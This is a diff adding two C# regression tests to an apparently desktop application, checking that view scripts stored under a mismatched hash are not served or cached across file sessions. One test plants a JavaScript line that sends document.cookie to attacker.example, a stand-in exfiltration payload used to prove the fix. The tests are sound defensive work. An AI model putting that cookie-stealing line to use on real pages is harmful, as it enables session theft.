@@ -1,5 +1,6 @@
 using System.Text;
 using System.Text.RegularExpressions;
+using Microsoft.Data.Sqlite;
 using Nendo.Engine;
 
 namespace Nendo.Desktop.Tests;
@@ -221,6 +222,83 @@ public sealed class DesktopExtensionServingTests
         Assert.AreEqual(404, (await session.ReadExtensionAssetAsync(host, "SKILL.md")).Status);
         var refusal = Assert.ThrowsExactly<NendoPreconditionException>(() => session.RequireExtensionWriter(skillId));
         Assert.AreEqual("actor-not-allowed", refusal.Code);
+    }
+
+    /// <summary>
+    /// DAE-01. A file's stored hash is only shape-checked when it opens, and view content was
+    /// cached by that stated hash for as long as the window lived. A crafted file could file its
+    /// own script under the hash of a well-known view's script, and the next file opened in the
+    /// window then ran the planted bytes at its own origin, with its own records.
+    /// </summary>
+    [TestMethod]
+    public async Task ContentFiledUnderAnotherHashIsNeitherServedNorCachedForTheNextFile()
+    {
+        const string Planted = "fetch('https://attacker.example/?d=' + document.cookie);";
+        await using var crafted = new DesktopTestWorkspace();
+        await SeedAsync(crafted.FilePath);
+        await using (var outside = new SqliteConnection(new SqliteConnectionStringBuilder
+        {
+            DataSource = crafted.FilePath, Mode = SqliteOpenMode.ReadWrite, Pooling = false,
+        }.ToString()))
+        {
+            await outside.OpenAsync();
+            await using var command = outside.CreateCommand();
+            command.CommandText = "UPDATE __nendo_extension_blob SET content = @content, byte_length = @length WHERE sha256 = @sha;";
+            command.Parameters.AddWithValue("@content", Encoding.UTF8.GetBytes(Planted));
+            command.Parameters.AddWithValue("@length", Encoding.UTF8.GetByteCount(Planted));
+            command.Parameters.AddWithValue("@sha", NendoExtensionContent.Sha256(Encoding.UTF8.GetBytes(Script)));
+            Assert.AreEqual(1, await command.ExecuteNonQueryAsync());
+        }
+        await using var genuine = new DesktopTestWorkspace();
+        await SeedAsync(genuine.FilePath);
+        await using var session = new DesktopSessionController(fileHistoryRoot: crafted.FileHistoryRoot, deviceStateRoot: crafted.FileHistoryRoot);
+
+        await session.OpenAsync(crafted.FilePath);
+        var craftedRuntime = (await session.GetViewAsync()).Extensions!;
+        Assert.IsTrue(craftedRuntime.Run, "Views run for the crafted file, so only the hash check can refuse it.");
+        var craftedHost = new Uri(craftedRuntime.Packages.Single().Origin!).Host;
+        var planted = await session.ReadExtensionAssetAsync(craftedHost, "app.js");
+        Assert.AreEqual(500, planted.Status, "Bytes that do not match their hash are not served: " + Encoding.UTF8.GetString(planted.Content));
+
+        await session.CloseAsync();
+        await session.OpenAsync(genuine.FilePath);
+        var genuineHost = new Uri((await session.GetViewAsync()).Extensions!.Packages.Single().Origin!).Host;
+        var script = await session.ReadExtensionAssetAsync(genuineHost, "app.js");
+        Assert.AreEqual(200, script.Status);
+        Assert.AreEqual(Script, Encoding.UTF8.GetString(script.Content), "The next file's view gets its own script, not the planted one.");
+    }
+
+    /// <summary>
+    /// DAE-01, the second half: view content is cached for one file session only. Content
+    /// cached while a file was open is not answered once it closes, so a reopened file is read
+    /// afresh, and a cache can never carry one file's bytes into another file's view.
+    /// </summary>
+    [TestMethod]
+    public async Task CachedViewContentEndsWithTheFileSession()
+    {
+        await using var workspace = new DesktopTestWorkspace();
+        await SeedAsync(workspace.FilePath);
+        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
+        await session.OpenAsync(workspace.FilePath);
+        var host = new Uri((await session.GetViewAsync()).Extensions!.Packages.Single().Origin!).Host;
+        Assert.AreEqual(200, (await session.ReadExtensionAssetAsync(host, "app.js")).Status, "Read once, so it is cached.");
+        await session.CloseAsync();
+
+        // Damaged while closed: a read from the file now answers 500, a cache hit would answer 200.
+        await using (var outside = new SqliteConnection(new SqliteConnectionStringBuilder
+        {
+            DataSource = workspace.FilePath, Mode = SqliteOpenMode.ReadWrite, Pooling = false,
+        }.ToString()))
+        {
+            await outside.OpenAsync();
+            await using var command = outside.CreateCommand();
+            command.CommandText = "UPDATE __nendo_extension_blob SET content = X'2F2F', byte_length = 2 WHERE sha256 = @sha;";
+            command.Parameters.AddWithValue("@sha", NendoExtensionContent.Sha256(Encoding.UTF8.GetBytes(Script)));
+            Assert.AreEqual(1, await command.ExecuteNonQueryAsync());
+        }
+        await session.OpenAsync(workspace.FilePath);
+        Assert.AreEqual(500, (await session.ReadExtensionAssetAsync(host, "app.js")).Status,
+            "The reopened file was read afresh, not answered from the last session's cache.");
     }
 
     private static async Task SeedAsync(string path)
